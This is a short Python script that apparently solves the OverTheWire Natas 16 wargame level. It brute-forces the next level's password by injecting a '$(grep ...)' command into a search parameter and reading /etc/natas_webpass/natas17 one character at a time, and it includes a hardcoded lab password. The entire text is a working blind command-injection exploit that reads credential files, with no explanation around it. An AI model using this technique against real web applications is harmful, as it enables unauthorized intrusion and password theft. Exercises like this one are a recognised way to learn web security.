#brute forcing command injection in order to get pw
import requests

username = "natas16"
password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
url = "http://natas16.natas.labs.overthewire.org/"

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
found = ""

while len(found) < 32:
    for c in charset:
        injection = f'bla$(grep ^{found + c} /etc/natas_webpass/natas17)'
        r = requests.get(url, params={"needle": injection, "submit": "Search"}, auth=(username, password))
        
        if "bla" not in r.text:
            found += c
            print(f"[+] Current password: {found}")
            break
